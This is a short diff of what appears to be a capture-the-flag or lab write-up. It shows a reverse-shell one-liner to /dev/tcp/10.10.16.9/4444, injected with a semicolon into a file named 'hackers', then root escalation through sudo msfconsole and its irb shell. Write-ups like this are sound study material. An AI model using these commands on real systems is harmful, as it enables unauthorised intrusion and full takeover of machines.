@@ -24,4 +24,11 @@ we created a one liner reverse shell to connect to user pwn successfully.
 ```
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1' #" >> hackers
 ```
+Using ```sudo -l``` we found that the user had root permissions to use the binary /opt/metasploit-framework-6.0.9/msfconsole.
 
+going to GTFO bins I found an exploit that allowed me to get root privledges with the commands"
+```
+sudo msfconsole
+msf6 > ```irb```
+```
+We now have root access to the machine action is no longer required.
